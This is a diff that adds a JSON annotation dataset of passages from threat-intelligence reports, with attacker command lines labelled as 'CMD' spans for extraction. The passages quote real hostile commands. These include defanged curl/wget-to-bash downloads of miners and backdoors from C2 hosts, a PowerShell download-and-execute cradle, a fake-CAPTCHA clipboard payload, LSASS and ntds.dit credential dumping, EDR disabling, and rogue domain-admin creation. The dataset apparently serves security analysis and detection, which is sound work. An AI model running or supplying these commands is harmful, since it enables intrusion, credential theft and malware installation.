@@ -1,0 +1,346 @@
+{
+  "id": 55,
+  "text": "The attacker then attempted to download multiple payloads from C2 servers: curl hxxp://103.135.101[.]15/wocaosinm.sh;wget hxxp://103.135.101[.]15/wocaosinm.sh;sh wocaosinm.sh;rm -r wocaosinm.sh C:\\Windows\\system32\\cmd.exe /d /s /c \"$(curl -s hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64 -w0)\" C:\\Windows\\system32\\cmd.exe /d /s /c \"wget hxxp://vps-zap812595-1.zap-srv[.]com:3000/sex.sh && bash sex.sh\" C:\\Windows\\system32\\cmd.exe /d /s /c \"$(curl -s hxxp://help.093214[.]xyz:9731/fn32.sh | bash | gzip -n | base64 -w0)\" C:\\Windows\\system32\\cmd.exe /d /s /c \"curl -s -L hxxp://31.56.27[.]97/scripts/4thepool_miner.sh | bash -s; wget -qO- hxxp://31.56.27[.]97/scripts/4thepool_miner.sh | bash -s\" Notably, the C2 domain keep.camdvr[.]org was also observed in Case #2, indicating this is likely the same threat actor or campaign.",
+  "label": [
+    [
+      194,
+      310,
+      "CMD"
+    ],
+    [
+      310,
+      418,
+      "CMD"
+    ],
+    [
+      418,
+      536,
+      "CMD"
+    ],
+    [
+      536,
+      641,
+      "CMD"
+    ],
+    [
+      643,
+      709,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 56,
+  "text": "t actors also executed discovery commands such as whoami and echo $((41*271)) , which we assess was an attempt to probe for command execution capabilities and identify the underlying operating system. Figure 1: React2Shell exploitation from the dashboard (Case #1) Case #2 (Windows Endpoint) The threat actor attempted to download multiple payloads from C2 servers: C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"wget hxxp://45.76.155[.]14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim\" C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"$(curl -s hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64 -w0)\" Interestingly enough, the attacker ran the command ver || id , which is an OS fingerprinting technique used to determine whether the compromised system is running Windows or Linux.",
+  "label": [
+    [
+      61,
+      77,
+      "CMD"
+    ],
+    [
+      366,
+      525,
+      "CMD"
+    ],
+    [
+      526,
+      641,
+      "CMD"
+    ],
+    [
+      693,
+      702,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 57,
+  "text": "The threat actor exploited the vulnerable instance of Next.js and attempted to download an unknown payload with the following command to the Windows endpoint: C:\\Windows\\system32\\cmd.exe /d /s /c \"curl hxxp://207.148.79[.]178:6608/sys.sh | bash\" Followed by an attempt to download the Linux-based cryptocurrency miner: C:\\\\Windows\\\\system32\\\\cmd.exe /d /s /c \\\"wget hxxp://216.158.232[.]43:12000/sex.sh && bash sex.sh\\\" Approximately 6 hours later, they attempted to download a Linux backdoor: C:\\\\Windows\\\\system32\\\\cmd.exe /d /s /c \\\"((curl -sL hxxp://45.32.158.54/5e51aff54626ef7f/x86_64 -o /tmp/x86_64;chmod 777 /tmp/x86_64;/tmp/x86_64) || (wget hxxp://45.32.158.54/5e51aff54626ef7f/x86_64 -O /tmp/x86_64;chmod 777 /tmp/x86_64;/tmp/x86_64))\\\" The threat actors also executed discovery commands such as whoami and echo $((41*271)) , which we assess was an attempt to probe for command execution capabilities and identify the underlying operating system.",
+  "label": [
+    [
+      159,
+      244,
+      "CMD"
+    ],
+    [
+      319,
+      418,
+      "CMD"
+    ],
+    [
+      494,
+      745,
+      "CMD"
+    ],
+    [
+      817,
+      833,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 81,
+  "text": "n. After that, the attacker checked whether they had sufficient privileges to execute code using batch files that ran simple commands such as whoami: %COMSPEC% /Q /c echo whoami ^> %SYSTEMROOT%\\Temp\\__output > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat Persistence was then established by creating a suspicious service entry in the registry under: reg:\\\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\YlHXQbXO With SYSTEM privileges, the attacker attempted several methods to dump LSASS (Local Security Authority Subsystem Service) memory: Using rundll32.exe: C:\\Windows\\system32\\cmd.exe /Q /c CMD.exe /Q /c for /f \"tokens=1,2 delims= \" ^%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+0000^24 ^%B \\Windows\\Temp\\vdpk2Y.sav full The command locates the lsass.exe process, which holds credentials in memory, extracts its PID, and invokes an internal function of comsvcs.dll to dump LSASS memory and save it.",
+  "label": [
+    [
+      150,
+      290,
+      "CMD"
+    ],
+    [
+      618,
+      834,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 82,
+  "text": "s\\Temp\\vdpk2Y.sav full The command locates the lsass.exe process, which holds credentials in memory, extracts its PID, and invokes an internal function of comsvcs.dll to dump LSASS memory and save it. This technique is commonly used in post-exploitation (e.g., Mimikatz or other living off the land tools). Loading a temporary DLL (BDjnNmiX.dll): C:\\Windows\\system32\\cmd.exe /Q /c cMd.exE /Q /c for /f \"tokens=1,2 delims= \" ^%A in ('\"tAsKLISt /fi \"Imagename eq lSAss.ex*\" | find \"lsass\"\"') do rundll32.exe C:\\Windows\\Temp\\BDjnNmiX.dll #+0000^24 ^%B \\Windows\\Temp\\sFp3bL291.tar.log full The command tries to dump the LSASS memory again, but this time using a custom DLL. Running a PowerShell script (Base64-encoded): The script leverages MiniDumpWriteDump via reflection. It uses the Out-Minidump function that writes a process dump with all process memory to disk, similar to running procdump.exe.",
+  "label": [
+    [
+      367,
+      585,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 112,
+  "text": "Note that all of the system commands executed are through cmd.exe with the ShellExecuteW API It searches for Microsoft Defender's installation folder under C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\* , targeting only the directory with the most recent modification date, which indicates the currently used version Create a folder C:\\ProgramData\\roming and a directory link with mklink to point to the directory found with the following command: cmd.exe /c mklink /D \"C:\\ProgramData\\roming\" C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0 It then runs C:\\Windows\\System32\\ClipUp.exe with the following parameter: -ppl C:\\ProgramData\\roming\\MsMpEng.exe , which overwrites MsMpEng.exe with junk data, effectively disabling the EDR even after a restart The author appears to have copied code from EDR-Freeze to start ClipUp.exe .",
+  "label": [
+    [
+      454,
+      564,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 122,
+  "text": "the filename ce-notes.txt used to stage stolen data on disk. We discovered CE-Notes in 2024 when we observed MuddyWater deploying EXE and DLL versions of it on the system of an organization in Israel. CE-Notes was downloaded with the following PowerShell command: \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression Both versions of the browser-data stealer attempt to steal and decrypt the app-bound encryption key stored in the Local State file ( %APPDATA%\\Local\\Google\\Chrome\\User Data\\Local State ) of Chromium browsers (Chrome, Brave, and Edge). App-bound encryption was introduced in Chrome version 127, enabling Chrome to encrypt data tied to app identity. Cybercriminals and APT groups have caught on and are actively trying to work around app-bound encryption to steal session keys.",
+  "label": [
+    [
+      264,
+      484,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 125,
+  "text": "the filename ce-notes.txt used to stage stolen data on disk. We discovered CE-Notes in 2024 when we observed MuddyWater deploying EXE and DLL versions of it on the system of an organization in Israel. CE-Notes was downloaded with the following PowerShell command: \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression Both versions of the browser-data stealer attempt to steal and decrypt the app-bound encryption key stored in the Local State file ( %APPDATA%\\Local\\Google\\Chrome\\User Data\\Local State ) of Chromium browsers (Chrome, Brave, and Edge). App-bound encryption was introduced in Chrome version 127, enabling Chrome to encrypt data tied to app identity. Cybercriminals and APT groups have caught on and are actively trying to work around app-bound encryption to steal session keys.",
+  "label": [
+    [
+      264,
+      484,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 136,
+  "text": ", we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"",
+  "label": [
+    [
+      379,
+      499,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 137,
+  "text": "e were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report .",
+  "label": [
+    [
+      199,
+      290,
+      "CMD"
+    ],
+    [
+      290,
+      343,
+      "CMD"
+    ],
+    [
+      343,
+      382,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 144,
+  "text": "Exec output. After collecting and exfiltrating data from the network shares, the threat actor ran one last ipconfig command before disconnecting the RDP session, ending discovery activity for day six. On day eight of the intrusion, the threat actor returned to the beachhead host via RDP from a second IP address 77.90.153[.]30 and immediately executed Netscan, as well as the following discovery commands: ipconfig \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\lusrmgr.msc\" \"C:\\Windows\\system32\\SecEdit.exe\" /export /cfg C:\\secpol.cfg\" notepad.exe C:\\secpol.cfg lusrmgr.msc is the Microsoft Management Console Local Users and Groups snap-in and is used for advanced management of local users and groups. The next command run launched secedit.exe, a native windows binary used to analyze and make changes to system security policies. In this case, the threat actor exported all local security policies to a file named secpol.cfg and reviewed the export using Notepad.",
+  "label": [
+    [
+      480,
+      542,
+      "CMD"
+    ],
+    [
+      542,
+      567,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 147,
+  "text": "On the Domain Controller, the threat actor created a user sccmad and added it to the Domain Admins and local Administrators groups, then enumerated currently logged-on users on the system to verify that the newly created user exists via the following commands: net USER sccmad /ADD net group \\\"Domain Admins\\\" sccmad /ADD /DOMAIN net LOCALGROUP administrators sccmad /add quser.exe The threat actor then leveraged Impacket to remotely execute the following command on the Domain Controller: cmd.exe /Q /c echo C:\\Windows\\system32\\cmd.exe /C vssadmin list shadows /for=C: ^> C:\\Windows\\Temp\\__output > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat Impacket automatically wrapped this command in its standard batch file execution pattern, creating a temporary file named execute.bat under C:\\Windows\\TEMP\\ folder, running the vssadmin command to enumerate Volume Shadow Copy snapshots, redirecting the output, and then deleting the batch file to remove artifacts.",
+  "label": [
+    [
+      261,
+      281,
+      "CMD"
+    ],
+    [
+      282,
+      329,
+      "CMD"
+    ],
+    [
+      330,
+      371,
+      "CMD"
+    ],
+    [
+      491,
+      726,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 158,
+  "text": "They checked their IP address after this: C:\\Windows\\system32\\curl.exe ipinfo[.]io And then checked their IP address again: C:\\Windows\\system32\\curl.exe ipinfo[.]io They then tried to use a tool called ROADtools Token eXchange (roadtx) : C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\roadtx.exe prtauth -r msgraph -c msteams And then erroneously tried to run the same tool (as an executable) via Python: C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\roadtx.exe prtauth -r msgraph -c msteams Then ran it again: C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\roadtx.exe describe And then tried to run it again, erroneously, using Python: C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\python.exe C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\roadtx.exe describe They seemed to be having trouble.",
+  "label": [
+    [
+      124,
+      165,
+      "CMD"
+    ],
+    [
+      238,
+      349,
+      "CMD"
+    ],
+    [
+      429,
+      615,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 184,
+  "text": "\\\\ntds.dit,C:\\\\windows\\\\system32\\\\config\\\\SYSTEM,C:\\\\windows\\\\system32\\\\config\\\\SECURITY\" -quiet For persistence and re-entry, the threat actor installed the RustDesk remote access tool on several hosts. In a subsequent session, the threat actor established a SSH tunnel to an external server at 193.242.184[.]150 to proxy their activity. ssh [email protected] -R *:10400 -p22 They continued discovery by deploying a renamed SoftPerfect network scanner (n.exe). Following this, they targeted a backup server, and attempted to dump credentials from the Veeam PostgreSQL database. psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\" Around the same time, the threat actor installed FileZilla on a file server and exfiltrated data via SFTP to 185.174.100[.]203. They performed LSASS memory dumping on multiple workstations using rundll32.exe with comsvcs.dll using a combination of remote services and WMI.",
+  "label": [
+    [
+      11,
+      96,
+      "CMD"
+    ],
+    [
+      339,
+      376,
+      "CMD"
+    ],
+    [
+      579,
+      698,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 187,
+  "text": "ommonly used remote access tool for your users? Does the software being installed make sense for the users job role? Hunt for LSASS memory dumping via comsvcs.dll with tasklist enumeration : cmd.exe /Q /c for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, #+000024 %%B \\\\Windows\\\\Temp\\\\*.*",
+  "label": [
+    [
+      191,
+      385,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 188,
+  "text": "wbadmin start backup -backuptarget:\\\\\\\\127.0.0.1\\\\C$\\\\ProgramData\\\\ -include:\"C:\\\\windows\\\\NTDS\\\\ntds.dit,C:\\\\windows\\\\system32\\\\config\\\\SYSTEM,C:\\\\windows\\\\system32\\\\config\\\\SECURITY\" -quiet Hunt for rapid domain enumeration sequences within short time-frames (< 5 minutes): cmd.exe systeminfo.exe nltest.exe /dclist: nltest.exe /domain_trusts whoami.exe /groups net.exe group \"domain admins\" /dom net.exe group \"enterprise admins\" /dom Monitor for DNS zone exports targeting multiple domains : Look for Export-DnsServerZone commands targeting _msdcs.*,",
+  "label": [
+    [
+      0,
+      191,
+      "CMD"
+    ],
+    [
+      319,
+      344,
+      "CMD"
+    ],
+    [
+      364,
+      399,
+      "CMD"
+    ],
+    [
+      399,
+      437,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
+{
+  "id": 261,
+  "text": "tomCaptcha variant of this technique works as follows. After the fake automatic verification process, victims are presented with a simulated reCaptcha challenge displaying an I m not a robot checkbox. Simulated reCaptcha controls Clicking the checkbox triggers a popup with instructions in Ukrainian, directing users to Click the Copy token button in the popup Press Windows + R to open the Run dialog Paste and execute the command Custom reCaptcha popup in Ukrainian with Copy token button The button runs a function copyToken() which contains a PowerShell commandlet designed to run invisibly. function copyToken(){ //--headless \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\ProgramData\\Microsoft Windows\\SystemHealthSvc.ps1\" let code = `iex ((New-Object System.Net.WebClient).DownloadString(\\\\\"ht\\\\\"+\\\\\"tps://zoomconference.a\\\\\"+\\\\\"pp/cptch/${clientId}\\\\\"));` navigator.clipboard.writeText(\"conhost.exe --headless \\\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -c \\\"\"+ code +\"\\\"\") } The code downloads and executes the next stage PowerShell script from hxxps://zoomconference[.]app/cptch/${clientId} , where ${clientId} is the same ID as described above.",
+  "label": [
+    [
+      631,
+      768,
+      "CMD"
+    ],
+    [
+      769,
+      1100,
+      "CMD"
+    ]
+  ],
+  "Comments": [],
+  "labels": null
+}
